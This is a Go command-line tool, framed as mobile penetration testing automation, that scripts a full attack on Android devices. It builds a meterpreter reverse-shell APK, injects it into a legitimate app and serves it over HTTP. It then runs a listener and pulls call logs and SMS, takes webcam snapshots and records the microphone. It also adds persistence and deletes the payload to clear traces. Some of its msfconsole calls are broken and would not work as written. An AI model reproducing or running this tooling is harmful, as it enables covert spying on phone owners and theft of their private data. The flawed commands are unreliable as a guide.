// Mobile Penetration Testing Automation Script
// Author: Muhammad Sudais Usmani
// Description: This script automates various tasks related to mobile pentesting.

package main

import (
    "bufio"
    "fmt"
    "os"
    "os/exec"
)

func runCommand(command string) {
    fmt.Println("[+] Executing:", command)
    cmd := exec.Command("sh", "-c", command)
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    cmd.Run()
}

func checkADB() {
    runCommand("adb devices")
    runCommand("adb connect 192.168.170.101:5555")
}

func adbShellAccess() {
    runCommand("adb shell")
}

func generatePayload() {
    runCommand("msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.130.129 LPORT=443 -o backdoor.apk")
}

func injectPayload() {
    reader := bufio.NewReader(os.Stdin)
    fmt.Print("Enter path to original APK: ")
    originalAPK, _ := reader.ReadString('\n')
    originalAPK = originalAPK[:len(originalAPK)-1] // Trim newline
    command := fmt.Sprintf("msfvenom -x %s -p android/meterpreter/reverse_tcp LHOST=192.168.130.129 LPORT=443 -o infected_app.apk", originalAPK)
    runCommand(command)
}

func startHTTPServer() {
    runCommand("python3 -m http.server 8080 &")
}

func startMSFListener() {
    runCommand("msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 192.168.130.129; set LPORT 443; exploit'")
}

func controlDevice() {
    runCommand("msfconsole -q -x 'sessions'")
    reader := bufio.NewReader(os.Stdin)
    fmt.Print("Enter session ID to interact with: ")
    sessionID, _ := reader.ReadString('\n')
    sessionID = sessionID[:len(sessionID)-1] // Trim newline
    command := fmt.Sprintf("msfconsole -q -x 'sessions -i %s'", sessionID)
    runCommand(command)
}

func extractData() {
    runCommand("msfconsole -q -x 'dump_calllog'")
    runCommand("msfconsole -q -x 'dump_sms'")
    runCommand("msfconsole -q -x 'webcam_snap'")
    runCommand("msfconsole -q -x 'record_mic 10'")
}

func maintainAccess() {
    runCommand("msfconsole -q -x 'run persistence -A'")
}

func clearTraces() {
    runCommand("adb shell rm /sdcard/backdoor.apk")
}

func main() {
    for {
        fmt.Println("\n[ Mobile Pentesting Automation ]")
        fmt.Println("1) Check ADB Connection")
        fmt.Println("2) Gain ADB Shell Access")
        fmt.Println("3) Generate Malicious APK")
        fmt.Println("4) Inject Payload into APK")
        fmt.Println("5) Start HTTP Server for Deployment")
        fmt.Println("6) Start Metasploit Listener")
        fmt.Println("7) Control Compromised Device")
        fmt.Println("8) Extract Data from Target")
        fmt.Println("9) Maintain Access")
        fmt.Println("10) Clear Traces")
        fmt.Println("11) Exit")
        fmt.Print("Choose an option: ")
        
        var choice int
        fmt.Scanln(&choice)
        
        switch choice {
        case 1:
            checkADB()
        case 2:
            adbShellAccess()
        case 3:
            generatePayload()
        case 4:
            injectPayload()
        case 5:
            startHTTPServer()
        case 6:
            startMSFListener()
        case 7:
            controlDevice()
        case 8:
            extractData()
        case 9:
            maintainAccess()
        case 10:
            clearTraces()
        case 11:
            fmt.Println("Exiting...")
            return
        default:
            fmt.Println("Invalid option, please try again.")
        }
    }
}
